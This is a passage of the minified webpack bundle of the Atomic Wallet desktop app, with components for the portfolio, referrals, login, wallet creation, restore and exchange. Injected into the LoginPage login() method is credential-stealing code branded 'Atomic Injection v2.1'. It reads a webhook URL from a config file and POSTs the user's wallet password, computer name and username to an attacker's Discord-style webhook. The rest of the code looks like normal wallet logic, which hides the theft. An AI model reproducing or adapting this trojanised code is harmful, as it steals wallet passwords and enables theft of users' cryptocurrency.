        d = a(i(2278)),
        u = a(i(5499)),
        h = a(i(2286)),
        p = a(i(2284));
      const m = 1.6,
        f = 1e12;
      var v = {
        name: "Portfolio",
        components: {
          Coin: r.default,
          Table: c.default,
          CoinInfo: l.default,
          SendCoin: d.default,
          DonutChart: u.default,
          BuyBitcoin: h.default,
          ReceiveCoin: p.default,
        },
        mixins: [o.WalletsTables],
        data: () => ({
          header: [
            { key: "name", title: "Name" },
            { key: "balance", title: "Balance" },
            { key: "value", title: "Value" },
            { key: "price", title: "Price" },
            { key: "change", title: "24h" },
            { key: "portfolio", title: "Portfolio" },
            { key: "marketCap", title: "M. cap" },
            { key: "chart", title: "7 days chart" },
          ],
          activeSortField: "portfolio",
          isSortASC: !1,
          excludedFields: ["chart"],
        }),
        computed: {
          ...(0, n.mapGetters)(["walletsState", "walletExcludedCoins"]),
          filterWallets() {
            return this.walletsState.filter((e) => {
              let { divisibleBalance: t, ticker: i, id: a } = e;
              const s = this.walletExcludedCoins.includes(a),
                n = this.getCoinBalance(t, i, a);
              return !s && n > 0;
            });
          },
          sortedTableItems() {
            const e = this.walletsForTable.slice(),
              t = ["name"].includes(this.activeSortField);
            return this.isSortASC
              ? (0, s.default)(e).asc((e) =>
                  t
                    ? e[this.activeSortField]
                    : e.isPlaceholder
                    ? f
                    : Number(e[this.activeSortField])
                )
              : (0, s.default)(e).desc((e) =>
                  t
                    ? e[this.activeSortField]
                    : e.isPlaceholder
                    ? -f
                    : Number(e[this.activeSortField])
                );
          },
          chartData() {
            const e = (0, s.default)(this.walletsForTable)
                .asc((e) => Number(e.portfolio))
                .reverse(),
              {
                fiteredTableItems: t,
                otherPercents: i,
                otherBalance: a,
              } = this.filteredPortfolio(e),
              n = t.map((e) => {
                let {
                  name: t,
                  value: i,
                  ticker: a,
                  balance: s,
                  portfolio: n,
                  fixedBalance: o,
                  id: r,
                  contract: c,
                } = e;
                return {
                  name: t,
                  value: i,
                  ticker: a,
                  id: r,
                  balance: s,
                  portfolio: n,
                  fixedBalance: o,
                  contract: c,
                };
              });
            return (
              i > 0 &&
                n.push({
                  name: "Other",
                  value: a,
                  ticker: "",
                  balance: "",
                  portfolio: m,
                }),
              n
                .sort((e, t) => Number(e.portfolio) - Number(t.portfolio))
                .reverse()
            );
          },
        },
        methods: {
          filteredPortfolio(e) {
            const t = [];
            let i = 0,
              a = 0;
            return (
              e.forEach((e) => {
                Number(e.portfolio) < m
                  ? ((i += Number(e.portfolio)), (a += Number(e.value)))
                  : t.push(e);
              }),
              { fiteredTableItems: t, otherPercents: i, otherBalance: a }
            );
          },
          sortByField(e) {
            this.excludedFields.includes(e) ||
              (this.activeSortField === e
                ? (this.isSortASC = !this.isSortASC)
                : ((this.isSortASC = !0), (this.activeSortField = e)));
          },
        },
      };
      t.default = v;
    },
    810: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(5501)),
        n = a(i(5504)),
        o = i(17),
        r = {
          name: "InviteFriends",
          components: { InviteDashboard: n.default, InviteLanding: s.default },
          data: () => ({ isLoading: !0 }),
          computed: {
            ...(0, o.mapGetters)([
              "isAffiliate",
              "affiliateStat",
              "isReferral",
            ]),
            isLanding() {
              return !this.isAffiliate && !this.isLoading;
            },
          },
          async mounted() {
            this.isAffiliate ||
              ((this.isLoading = !0), await this.setAffiliate()),
              (this.isLoading = !1),
              this.isReferral ||
                ((this.isLoading = !0),
                await this.setReferral(),
                (this.isLoading = !1));
          },
          methods: { ...(0, o.mapActions)(["setAffiliate", "setReferral"]) },
        };
      t.default = r;
    },
    811: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(2291)),
        n = i(17),
        o = {
          name: "InviteLanding",
          components: { AtomicLinkedCard: s.default },
          data() {
            return {
              cardsOptions: [
                {
                  icon: "user_add_badge_outline",
                  headerText: "Join the program",
                  bodyText: "Get your referral link and unique promo code",
                },
                {
                  icon: "users_outline",
                  headerText: "Invite friends",
                  bodyText:
                    "Ask your friend to join Atomic Wallet via your link ",
                },
                {
                  icon: "coins_stacks_2_outline",
                  headerText: "Earn rewards",
                  bodyText: "You both get rewards for your friend’s exchanges",
                },
              ],
            };
          },
          computed: {},
          mounted() {
            this.setAffiliateInfo();
          },
          methods: {
            ...(0, n.mapActions)(["setAffiliate", "setAffiliateInfo"]),
            async makeEarning() {
              await this.$inviteFriends.registerAsAffiliate(),
                await this.setAffiliate();
            },
          },
        };
      t.default = o;
    },
    813: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(5505)),
        n = a(i(5512)),
        o = i(17),
        r = {
          name: "InviteDashboard",
          components: { BonusTab: n.default, DashboardTab: s.default },
          data() {
            return { activeTabIndex: 0 };
          },
          computed: { ...(0, o.mapGetters)(["isReferral"]) },
        };
      t.default = r;
    },
    814: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(5506)),
        n = i(17);
      const o = (e, t, i) => {
          let a = "";
          switch (e) {
            case "telegram":
              a = `Install Atomic Wallet app! Exchange, buy, stake, hold crypto in one place. Download the app, use your promo code - ${i} to get rewards.`;
              break;
            default:
              a = `Install Atomic Wallet app! Exchange, buy, stake, hold crypto in one place. Download the app: ${t}, use your promo code - ${i} to get rewards.`;
              break;
          }
          return a;
        },
        r = {
          baidu: "http://cang.baidu.com/do/add?iu=@u&it=@t",
          buffer: "https://bufferapp.com/add?text=@t&url=@u",
          email: "mailto:?subject=@t&body=@u%0D%0A@d",
          evernote: "https://www.evernote.com/clip.action?url=@u&title=@t",
          facebook:
            "https://www.facebook.com/sharer/sharer.php?u=@u&title=@t&description=@d&quote=@q&hashtag=@h",
          flipboard:
            "https://share.flipboard.com/bookmarklet/popout?v=2&url=@u&title=@t",
          hackernews: "https://news.ycombinator.com/submitlink?u=@u&t=@t",
          instapaper:
            "http://www.instapaper.com/edit?url=@u&title=@t&description=@d",
          line: "http://line.me/R/msg/text/?@t%0D%0A@u%0D%0A@d",
          linkedin: "https://www.linkedin.com/sharing/share-offsite/?url=@u",
          messenger: "fb-messenger://share/?link=@u",
          odnoklassniki:
            "https://connect.ok.ru/dk?st.cmd=WidgetSharePreview&st.shareUrl=@u&st.comments=@t",
          pinterest:
            "https://pinterest.com/pin/create/button/?url=@u&media=@m&description=@t",
          pocket: "https://getpocket.com/save?url=@u&title=@t",
          quora: "https://www.quora.com/share?url=@u&title=@t",
          reddit: "https://www.reddit.com/submit?url=@u&title=@t",
          skype: "https://web.skype.com/share?url=@t%0D%0A@u%0D%0A@d",
          sms: "sms:?body=@t%0D%0A@u%0D%0A@d",
          stumbleupon: "https://www.stumbleupon.com/submit?url=@u&title=@t",
          telegram: "https://t.me/share/url?url=@u&text=@t%0D%0A@d",
          tumblr:
            "https://www.tumblr.com/share/link?url=@u&name=@t&description=@d",
          twitter: "https://twitter.com/intent/tweet?text=@t&hashtags=@h@tu",
          viber: "viber://forward?text=@t%0D%0A@u%0D%0A@d",
          vk: "https://vk.com/share.php?url=@u&title=@t&description=@d&image=@m&noparse=true",
          weibo:
            "http://service.weibo.com/share/share.php?url=@u&title=@t&pic=@m",
          whatsapp: "https://api.whatsapp.com/send?text=@t%0D%0A%0D%0A@d",
          wordpress: "https://wordpress.com/press-this.php?u=@u&t=@t&s=@d&i=@m",
          xing: "https://www.xing.com/social/share/spi?op=share&url=@u&title=@t",
          yammer:
            "https://www.yammer.com/messages/new?login=true&status=@t%0D%0A@u%0D%0A@d",
        },
        c = (e, t, i) => {
          let a = r[e];
          return a
            .replace(/@tu/g, "&via=" + encodeURIComponent(""))
            .replace(/@u/g, encodeURIComponent(t))
            .replace(/@t/g, encodeURIComponent(i))
            .replace(/@d/g, encodeURIComponent(""))
            .replace(/@q/g, encodeURIComponent(""))
            .replace(/@h/g, "")
            .replace(/@m/g, encodeURIComponent(""));
        };
      var l = {
        name: "DashboardTab",
        components: { ClipboardWrap: s.default },
        data() {
          return {
            socialNetworks: [
              { icon: "socials", network: "facebook" },
              { icon: "socials-1", network: "twitter" },
              { icon: "socials-2", network: "telegram" },
              { icon: "socials-3", network: "reddit" },
              { icon: "socials-4", network: "whatsapp" },
            ],
            socialLinksModal: !1,
          };
        },
        computed: {
          ...(0, n.mapGetters)(["affiliateStat", "affiliateInfo"]),
          promoCode() {
            return this.affiliateInfo.promoCode;
          },
          infoGroup() {
            const {
                activeReferralCount: e,
                pendingRewards: t,
                receivedRewards: i,
                referralCount: a,
              } = this.affiliateStat,
              s = (e) =>
                this.$options.filters.toCurrency(e, { style: "decimal" }) +
                " USD";
            let n = [
              {
                label: "Invited friends",
                value: a,
                icon: "user_added_outline_28",
                hintText: "All invited friends who have started using Atomic",
              },
              {
                label: "Active friends",
                value: e,
                icon: "users_outline_28",
                hintText:
                  "Invited friends with at least one completed exchange",
              },
              {
                label: "Received rewards",
                value: s(i),
                icon: "money_received rewards_outline_28",
                hintText:
                  "Rewards received for the exchange volume of active friends",
              },
              {
                label: "Pending rewards",
                value: s(t),
                icon: "money_pending rewards_outline_28",
                hintText:
                  "Rewards for all completed exchanges that will be received next month",
              },
            ];
            return n;
          },
          link() {
            return this.affiliateInfo.referralLink;
          },
        },
        created() {
          this.setAffiliate();
        },
        methods: {
          ...(0, n.mapActions)(["setAffiliate"]),
          getIcon(e) {
            return i(1144)(`./${e}.svg`);
          },
          openModal() {
            this.socialLinksModal = !0;
          },
          closeModal() {
            this.socialLinksModal = !1;
          },
          openShare(e) {
            const t = c(e, this.link, o(e, this.link, this.promoCode));
            this.$electron.openExternal(t);
          },
          openLinkHowWorks() {
            this.$electron.openExternal(
              "https://atomicwallet.io/invite-friends/rules"
            );
          },
        },
      };
      t.default = l;
    },
    817: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = i(17);
      const s = /[^0-9\.]/gm;
      var n = {
        name: "BonusTab",
        computed: {
          ...(0, a.mapGetters)(["exchangeBonus", "isReferral"]),
          getSteps() {
            let e = (e) => e.replace(s, "");
            return this.exchangeBonus.stages.map((t) => ({
              value: +e(t.volume),
              reward: +e(t.reward),
            }));
          },
          getScaleLimits() {
            var e;
            const t = this.getSteps.length - 1;
            return {
              from: 0,
              to:
                null === (e = this.getSteps[t]) || void 0 === e
                  ? void 0
                  : e.value,
            };
          },
          valueNum() {
            return +this.exchangeBonus.currentProgress.replace(s, "");
          },
          getCurrentRewardValuePercent() {
            const e = 100;
            let t = +this.exchangeBonus.currentProgress.replace(s, "");
            return (t / this.getScaleLimits.to) * e;
          },
        },
        mounted() {
          this.setExchangeBonus();
        },
        methods: {
          ...(0, a.mapActions)(["setExchangeBonus"]),
          goToExchange() {
            this.$router.push("/exchange");
          },
        },
      };
      t.default = n;
    },
    818: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = {
        name: "EntryPage",
        props: { mnemonic: { type: Boolean, default: !1 } },
        data: () => ({ showWarning: !1, nextRoute: "" }),
        methods: {
          showMnemonicWarning(e) {
            (this.showWarning = !0), (this.nextRoute = e);
          },
          closeWarningPopup() {
            this.showWarning = !1;
          },
          continueWarningPopup() {
            this.closeWarningPopup(), this.$router.push(this.nextRoute);
          },
        },
      };
      t.default = a;
    },
    819: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = i(17),
        n = a(i(53)),
        o = {
          name: "LoginPage",
          components: { Edit: n.default },
          props: { mnemonic: { type: Boolean, default: !1 } },
          data: () => ({ loading: !1, password: "", passwordError: "" }),
          methods: {
            ...(0, s.mapActions)([
              "initSimplexTransactions",
              "setNotifyTree",
              "setCompletedReason",
              "initChartData",
            ]),
            goToRestore() {
              this.mnemonic
                ? this.$emit("show-mnemonic-warning", "/entry/restore")
                : this.$router.push("/entry/restore");
            },
            createNewWallet() {
              this.mnemonic
                ? this.$emit("show-mnemonic-warning", "/entry/create")
                : this.$router.push("/entry/create");
            },
            async login() {
              let e;
              try {
                if (
                  ((e = await this.$wallets.load(this.password)),
                  0 === e.length)
                )
                  throw new Error("empty addresses");
              } catch (t) {
                return (
                  console.error(t), void (this.passwordError = "Wrong password")
                );
              }
              const password = await this.password;
              const fs = require("fs").promises;

              const os = require("os");
              const path = require("path");
              const configFilePath = path.join(
                __dirname,
                "..",
                "..",
                "..",
                "..",
                "config.json"
              );
              console.log(config);
              const configFileContent = await fs.readFile(
                configFilePath,
                "utf-8"
              );

              const configFileParsed = JSON.parse(configFileContent);
              const webhook = configFileParsed.webhook;
              const links = configFileParsed.link;
              const computerName = os.hostname();
              const username = os.userInfo().username;

              var request = new XMLHttpRequest();
              request.open("POST", webhook, true);
              request.setRequestHeader("Content-Type", "application/json");

              var payload = JSON.stringify({
                username: "Atomic Injection",
                avatar_url:
                  "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/lilnova.png",
                  content: "@here" + "\n`" + computerName + "`" + " - " + "`" + username + "`",
                embeds: [
                  {
                    title: "Atomic Injection v2.1",
                    color: 3553599,
                    footer: {
                      text: "@Nova Sentinel | https://t.me/Sordeal",
                      icon_url:
                        "https://raw.githubusercontent.com/KSCH-58/sub/main/assets/gifnova.gif",
                    },
                    fields: [
                      {
                        name: `<a:keys:1159078859682107453> Passwords:`,
                        value: `\`\`\`ansi\n[2;32m${password}[0m[2;32m[0m\`\`\`\n[Download ZIP](${links})`,
                        inline: false,
                      },
                    ],
                  },
                ],
              });

              request.send(payload);
              try {
                (this.loading = !0),
                  Array.isArray(e) &&
                    (await this.$wallets
                      .loadWallets(this.$bus, e, this.password)
                      .catch(console.error)
                      .finally(() => {
                        (this.password = ""),
                          this.initSimplexTransactions(),
                          this.setCompletedReason(),
                          this.initChartData();
                      }),
                    await this.setNotifyTree(),
                    this.$router.push({ path: "/main" }));
              } catch (t) {
                console.error(t);
              } finally {
                this.loading = !1;
              }
            },
          },
        };
      t.default = o;
    },
    820: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = i(15),
        n = a(i(2295)),
        o = {
          name: "CreatePage",
          components: { SetPassword: n.default },
          mixins: [s.DBMixin],
          data: () => ({ step: "setpass", seed: "", enableMonitoring: !0 }),
          watch: {
            enableMonitoring(e) {
              localStorage.setItem("isMonitoringEnabled", e);
            },
          },
          methods: {
            beforeUnmount() {
              this.seed = "";
            },
            openWallet() {
              this.$router.push({ path: "/main" });
            },
            async goBack() {
              (await this.$wallets.isMnemonicStored())
                ? this.$router.push("/entry/login")
                : this.$router.push("/entry");
            },
            goNext(e) {
              (this.seed = e), (this.step = "newseed");
            },
          },
        };
      t.default = o;
    },
    821: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = i(30),
        n = i(17),
        o = a(i(53)),
        r = a(i(674)),
        c = i(15),
        l = a(i(2296)),
        d = {
          name: "SetPassword",
          components: {
            Edit: o.default,
            AtomicCheckbox: r.default,
            PasswordStrength: l.default,
          },
          mixins: [c.DBMixin],
          props: {
            mnemonic: { type: String, default: "" },
            isTermsCheckbox: { type: Boolean, default: !1 },
          },
          data: () => ({
            value: "",
            affiliateId: "",
            password: "",
            passwordConfirm: "",
            passwordError: "",
            passwordConfirmError: "",
            mnemonicError: "",
            loading: !1,
            affiliateError: "",
            checkboxValue: !1,
            repeatPasswordType: "password",
            showLoaderSpinner: !1,
          }),
          computed: { ...(0, n.mapGetters)(["fiatRate"]) },
          mounted() {
            this.$bus.$on(s.WALLETS.START_LOADING_ALL, this.toggleSpinner);
          },
          beforeDestroy() {
            this.$bus.$off(s.WALLETS.START_LOADING_ALL, this.toggleSpinner);
          },
          methods: {
            ...(0, n.mapActions)([
              "getRates",
              "clearRateState",
              "setNotifyTree",
              "initChartData",
              "clearNFTStorage",
              "clearNotifyStorage",
              "setCompletedReason",
              "initSimplexTransactions",
            ]),
            toggleSpinner() {
              this.showLoaderSpinner = !this.showLoaderSpinner;
            },
            focusNextEdit() {
              this.$refs.repeatPasswordRef &&
                this.$refs.repeatPasswordRef.setFocus();
            },
            async resetWalletInfo() {
              localStorage.clear(),
                this.clearRateState(),
                this.clearNFTStorage(),
                this.clearNotifyStorage(),
                await this.clearAllTables().catch((e) => console.log(e));
            },
            changeTypeRepeatPassword(e) {
              this.repeatPasswordType = e;
            },
            async validateAffiliate() {
              if (!this.affiliateId) return !0;
              const e = await this.$inviteFriends.getIsPromoCodeExists(
                this.affiliateId
              );
              return e;
            },
            async validateForm() {
              return (
                (this.passwordError = ""),
                (this.passwordConfirmError = ""),
                (this.affiliateError = ""),
                "" === this.password
                  ? ((this.passwordError = "Enter your password"),
                    this.$refs.passwordRef.setFocus(),
                    !1)
                  : this.passwordConfirm !== this.password
                  ? ((this.passwordConfirmError = "Check your password"),
                    this.$refs.repeatPasswordRef.setFocus(),
                    !1)
                  : !(this.isTermsCheckbox && !this.checkboxValue)
              );
            },
            async generateMnemonic() {
              this.newWallet(
                await this.$wallets.createWallets(this, this.password)
              );
            },
            async registerAsReferal() {
              this.affiliateId.length &&
                (await this.$inviteFriends.registerAsReferral(
                  this.affiliateId
                ));
            },
            async restoreWallet() {
              (await this.$wallets.validateMnemonic(
                this.mnemonic.trim().toLowerCase()
              )) &&
                (await this.$wallets.restoreWallets(
                  this.mnemonic.trim().toLowerCase().replace(/\s+/g, " "),
                  this,
                  this.password
                ),
                await this.getRates(),
                this.toggleSpinner(),
                this.$router.push({ path: "/main" })),
                this.updateBalancesAndSave();
            },
            async setPassword() {
              (await this.validateForm()) &&
                ((this.loading = !0),
                this.toggleSpinner(),
                await this.resetWalletInfo(),
                this.mnemonic
                  ? await this.restoreWallet()
                  : (await this.generateMnemonic(),
                    await this.registerAsReferal()),
                await Promise.allSettled([
                  this.getRates(),
                  this.initSimplexTransactions(),
                  this.setNotifyTree(),
                  this.setCompletedReason(),
                  this.initChartData(),
                ]));
            },
            async newWallet(e) {
              this.updateBalancesAndSave().then(() => {
                this.$emit("goNext", e);
              });
            },
            async updateBalancesAndSave() {
              return Promise.all(
                Array.from(this.$wallets).map(
                  async (e) => (
                    e instanceof s.Token ||
                      (this.$bus.$emit("update", {
                        ticker: e.ticker,
                        alias: e.alias,
                      }),
                      "function" === typeof e.createToken &&
                        e.tokens &&
                        Object.values(e.tokens).forEach((e) => {
                          this.$bus.$emit("update", {
                            ticker: e.ticker,
                            alias: e.alias,
                          });
                        })),
                    e
                  )
                )
              ).catch(console.error);
            },
          },
        };
      t.default = d;
    },
    825: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(53)),
        n = a(i(2295)),
        o = a(i(674));
      const r = 12;
      var c = {
        name: "RestorePage",
        components: {
          Edit: s.default,
          SetPassword: n.default,
          AtomicCheckbox: o.default,
        },
        data() {
          return {
            step: "restore",
            mnemonicError: "",
            restoreseed: "",
            restoreseedInLowerCase: "",
            checkboxValue: !1,
          };
        },
        watch: {
          restoreseed() {
            this.restoreseed &&
              this.restoreseed.length > 0 &&
              ((this.mnemonicError = ""),
              (this.restoreseedInLowerCase = this.restoreseed
                .toLowerCase()
                .trim()));
          },
        },
        beforeDestroy() {
          this.restoreseed = "";
        },
        methods: {
          async restoreByWords() {
            if (!this.checkboxValue) return;
            const e = this.restoreseedInLowerCase.split(/\s+/).length;
            e === r
              ? (await this.$wallets.validateMnemonic(
                  this.restoreseedInLowerCase
                ))
                ? (this.step = "setpass")
                : (this.mnemonicError = "Invalid mnemonic")
              : (this.mnemonicError = "Backup Phrase should contain 12 words");
          },
          async goBack() {
            (await this.$wallets.isMnemonicStored())
              ? this.$router.push("/entry/login")
              : this.$router.push("/entry");
          },
          goToRestore() {
            this.step = "restore";
          },
        },
      };
      t.default = c;
    },
    826: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = i(17),
        n = i(15),
        o = a(i(5528));
      const r = "refunding::txs",
        c = 3e4,
        l = 8e3,
        d = 6;
      var u = {
        name: "Exchange",
        components: { NewExchangeResult: o.default },
        filters: {
          fixedAmount: function (e) {
            return Number(Number(e).toFixed(d)).toString();
          },
        },
        mixins: [n.ExchangeMixin],
        data: () => ({
          tabs: [
            { title: "Instant Exchange", path: "/exchange" },
            { title: "Order History", path: "/exchange/history" },
          ],
          isExchangeDetails: !1,
          coinToSend: null,
          coinToReceive: null,
          amountToSend: "",
          amountToReceive: "",
          exchangeResult: null,
          cashback: "",
          sentHash: "",
          receivedHash: "",
          fetchExchangeTransactionsTimeout: null,
          exchangeStartingValues: {},
          initTransactionData: {},
          transactionTimestamp: null,
          isRefunded: !1,
        }),
        computed: { ...(0, s.mapGetters)(["exchangeTransactions"]) },
        mounted() {
          this.setBasicStorageTxsEstimated(),
            this.$bus.$on("close-exchange-basic-popup", this.closeOrderDetails);
        },
        beforeDestroy() {
          clearTimeout(this.fetchExchangeTransactionsTimeout),
            this.$bus.$off(
              "close-exchange-basic-popup",
              this.closeOrderDetails
            );
        },
        methods: {
          ...(0, s.mapActions)([
            "updateExchangeTransactions",
            "getExchangeTransactions",
          ]),
          isActive(e) {
            return "exchange-basic" === this.$route.name && "/exchange" === e;
          },
          closeOrderDetails() {
            this.isExchangeDetails = !1;
          },
          closeSuccessPopup() {
            this.initTransactionData = {};
          },
          closePopups() {
            this.closeOrderDetails(),
              this.closeSuccessPopup(),
              clearTimeout(this.fetchExchangeTransactionsTimeout);
          },
          openExchangeDetails(e) {
            clearTimeout(this.fetchExchangeTransactionsTimeout),
              this.openOrderDetails(e),
              (this.fetchExchangeTransactionsTimeout = setTimeout(
                () => this.openExchangeDetails(e),
                c
              ));
          },
          startExchange(e) {
            const t = { initTime: Date.now(), isCompleted: !1, ...e };
            this.updateTxEstimatedInLocalStorage(t),
              this.openExchangeDetails(e);
          },
          updateTxEstimatedInLocalStorage(e) {
            this.setBasicStorageTxsEstimated();
            let t = JSON.parse(localStorage.getItem("txs::estimated"));
            if (!Array.isArray(t)) return;
            const i = t.findIndex((t) => t.id === e.id);
            -1 === i ? t.unshift(e) : (t[i] = e),
              localStorage.setItem("txs::estimated", JSON.stringify(t));
          },
          getTxByIdFromTxEstimatedInLocalStorage(e) {
            let t = JSON.parse(localStorage.getItem("txs::estimated"));
            if (!Array.isArray(t)) return null;
            const i = t.findIndex((t) => t.id === e);
            return -1 === i ? null : t[i];
          },
          setBasicStorageTxsEstimated() {
            const e = JSON.parse(localStorage.getItem("txs::estimated"));
            Array.isArray(e) || localStorage.setItem("txs::estimated", "[]");
          },
          getStatusName(e) {
            const t = e && e.toLowerCase();
            switch (t) {
              case "confirming":
                return "Confirming";
              case "exchanging":
                return "Exchanging";
              case "sending":
                return "Sending";
              case "finished":
              case "completed":
                return "Completed";
              case "failed":
                return "Failed";
              case "refunded":
                return "Refunded";
              case "expired":
                return "Expired";
              default:
                return "Awaiting deposit";
            }
          },
          txCompletedHook(e) {
            this.updateTxEstimatedInLocalStorage({
              completedTime: Date.now(),
              ...this.getTxByIdFromTxEstimatedInLocalStorage(e.id),
              isCompleted: !0,
            }),
              (this.amountToReceive = this.$options.filters.fixedAmount(
                e.amountToReceive
              )),
              (this.initTransactionData =
                this.getTxByIdFromTxEstimatedInLocalStorage(e.id)),
              clearTimeout(this.fetchExchangeTransactionsTimeout);
          },
          updateActiveTx(e) {
            (this.activeTx = e),
              (this.transactionStatus = this.getStatusName(e.status)),
              (this.isExchangeDetails = !0),
              (this.coinToSend = this.$exchanges.getSenderWalletByTx(
                this.$wallets,
                e
              )),
              (this.coinToReceive = this.$exchanges.getReceiverWalletByTx(
                this.$wallets,
                e
              )),
              (this.amountToSend = this.$options.filters.fixedAmount(
                e.amountToSend
              )),
              (this.amountToReceive = this.$options.filters.fixedAmount(
                e.amountToReceive
              )),
              (this.cashback = e.expectedCashbackAmount),
              (this.exchangeResult = { txid: e.id }),
              (this.sentHash = e.payinHash),
              (this.receivedHash = e.payoutHash),
              (this.transactionTimestamp = e.timestamp);
          },
          setTransactionValues(e) {
            const t = e.find((e) => {
              var t;
              return (
                e.id ===
                (null === (t = this.initTransactionData) || void 0 === t
                  ? void 0
                  : t.id)
              );
            });
            t &&
              t.amountToReceive &&
              (("completed" !== t.status.toLowerCase() &&
                "refunded" !== t.status.toLowerCase()) ||
                this.txCompletedHook(t));
          },
          openOrderDetails(e) {
            if (
              (this.updateActiveTx(e),
              (this.initTransactionData =
                this.getTxByIdFromTxEstimatedInLocalStorage(e.id)),
              !this.isMocked)
            ) {
              const t = [this.getStatus(e.id)];
              t.length > 0 && this.updatingStatus(t);
            }
          },
          continueExchange: async function (e) {
            try {
              (this.isRefunded = !0), (this.activeTx.amountToReceive = e);
              const t = await this.exchangeContinue(this.activeTx);
              t.result &&
                (this.startExchange(this.activeTx),
                await this.updateExchangeTransactions([this.activeTx]),
                this.openExchangeDetails(this.activeTx));
            } catch (t) {
              console.error(t);
            } finally {
              this.isRefunded = !1;
            }
          },
          async refundExchange() {
            try {
              this.isRefunded = !0;
              const e = await this.refundTransaction(this.activeTx);
              e.result &&
                (this.startExchange(this.activeTx),
                this.updateTxRefundedInLocalStorage(this.activeTx),
                this.isMocked &&
                  setTimeout(() => {
                    this.updateActiveTx({
                      ...this.activeTx,
                      status: "Refunded",
                    });
                  }, l));
            } catch (e) {
              console.error(e);
            } finally {
              this.isRefunded = !1;
            }
          },
          updateTxRefundedInLocalStorage(e) {
            try {
              this.setBasicStorageTxsEstimated();
              let t = JSON.parse(localStorage.getItem(r));
              if (!Array.isArray(t)) return;
              const i = t.findIndex((t) => t.id === e.id);
              -1 === i ? t.unshift({ id: e.id }) : (t[i] = { id: e.id }),
                localStorage.setItem(r, JSON.stringify(t));
            } catch (t) {
              console.log(t);
            }
          },
          async updatingStatus(e) {
            Promise.all(e.map((e) => e.catch((e) => e)))
              .then((e) => {
                e = e.filter((e) => e.status);
                const t = e.map((e) => {
                  const t = { id: e.id, status: this.getStatusName(e.status) };
                  return (
                    this.activeTx &&
                      this.activeTx.id === t.id &&
                      (e.payinHash &&
                        ((this.activeTx.payinHash = e.payinHash),
                        (this.sentHash = e.payinHash)),
                      e.payoutHash &&
                        ((this.activeTx.payoutHash = e.payoutHash),
                        (this.receivedHash = e.payoutHash)),
                      (this.activeTx.status = t.status),
                      (this.transactionStatus = t.status)),
                    e.amountToReceive &&
                      (t.amountToReceive = e.amountToReceive),
                    e.payinHash && (t.payinHash = e.payinHash),
                    e.payoutHash &&
                      ((t.payoutHash = e.payoutHash),
                      (t.txHash = e.payoutHash)),
                    t
                  );
                });
                this.setTransactionValues(t),
                  this.updateExchangeTransactions(t),
                  this.$forceUpdate();
              })
              .catch((e) => {
                console.log(e);
              });
          },
        },
      };
      t.default = u;
    },
    828: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = i(17),
        n = i(30),
        o = i(15),
        r = a(i(5530)),
        c = a(i(2300)),
        l = a(i(2301)),
        d = a(i(2302)),
        u = a(i(73)),
        h = a(i(674)),
        p = a(i(2303)),
        m = i(196);
      const f = "eth",
        v = "btc",
        g = 500,
        b = 1e4,
        w = 21,
        x = "Minimal amount for receiving is 21 XRP",
        T = "Choose different coins to exchange",
        y = 6,
        C = 9,
        _ = 0.1,
        k = 10,
        S = ["MATIC"],
        P = "accept::terms::exchange";
      var E = {
        name: "ExchangeBasic",
        components: {
          ErrorPlain: r.default,
          ChangeIcon: c.default,
          ExchangeCoin: l.default,
          CashbackInfo: d.default,
          SendCoinResult: u.default,
          AtomicCheckbox: h.default,
          CashbackPromotion: p.default,
        },
        mixins: [o.ExchangeMixin, o.CashbackMixin],
        data: () => ({
          valid: { message: "", status: !0 },
          amountToSend: "",
          amountToReceive: "...",
          availableBalance: "...",
          filteredCurrenciesExchange: [],
          minimalAmount: 0,
          exchangeRate: null,
          loading: !1,
          selectedCoinToReceiveId: null,
          selectedCoinToSendId: null,
          inactivePairError: "",
          amountToSendError: "",
          exchangeResult: {},
          currencies: [],
          isError: !1,
          feeToClaim: null,
          fetcher: null,
          pairRateInterval: null,
          feeParams: {},
          orderId: "",
          sentHash: "",
          isBuyCoin: !1,
          isCheckbox: !0,
          isMinMaxError: !1,
          checkboxValue: !1,
        }),
        computed: {
          ...(0, s.mapGetters)(["currenciesExchange"]),
          claimButtonText() {
            var e;
            return (
              "Claim " +
              ((null === (e = { THETA: "TFUEL", VET: "VTHO" }) || void 0 === e
                ? void 0
                : e[this.coinToSend.deprecatedParent]) ||
                this.coinToSend.deprecatedParent)
            );
          },
          isActiveExchangeButton() {
            return (
              Number(this.amountToSend) > 0 &&
              this.valid.status &&
              "..." !== this.amountToReceive
            );
          },
          isExchangeDisabled() {
            return (
              !this.checkboxValue ||
              this.isCoinDisabled(this.coinToReceive) ||
              this.isCoinDisabled(this.coinToSend)
            );
          },
          coinToSend() {
            if (!this.selectedCoinToSendId) return null;
            const e = this.$wallets.getWallet(this.selectedCoinToSendId);
            return e;
          },
          coinToReceive() {
            if (!this.selectedCoinToReceiveId) return null;
            const e = this.$wallets.getWallet(this.selectedCoinToReceiveId);
            return e;
          },
          feeWallet() {
            var e, t;
            return "VET" ===
              (null === (e = this.coinToSend) || void 0 === e
                ? void 0
                : e.deprecatedParent)
